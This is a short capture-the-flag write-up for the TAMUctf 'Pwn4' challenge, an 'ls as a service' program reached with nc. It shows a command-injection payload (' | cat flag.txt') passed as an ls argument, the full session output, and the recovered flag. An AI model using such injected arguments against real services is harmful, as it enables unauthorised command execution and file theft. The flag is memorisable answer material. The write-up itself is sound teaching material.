# Pwn4
Pwn, 100 points
## Description:
A binary file was attached, in addition to an address and port.
## Solution:
Let's run the binary:
```console
root@kali:/media/sf_CTFs/tamu/Pwn4# nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
-al
Result of ls -al:
total 20
drwxr-xr-x 1 root    root    4096 Feb 19 20:47 .
drwxr-xr-x 1 root    root    4096 Mar 14 21:45 ..
-r--r--r-- 1 pwnflag pwnflag   23 Feb 19 17:28 flag.txt
-rwsr-xr-x 1 pwnflag pwnflag 7504 Feb 19 17:28 pwn4
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
```
This service accepts parameters to be passed on to `ls` and provides us with the output.
The most trivial experiment to perform is to pass it a pipe to another command:
```console
root@kali:/media/sf_CTFs/tamu/Pwn4# echo " | cat flag.txt" | nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
Result of ls  | cat flag.txt:
gigem{5y573m_0v3rfl0w}
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
^C
```
The flag is easily outputted without a need to analyze the binary.
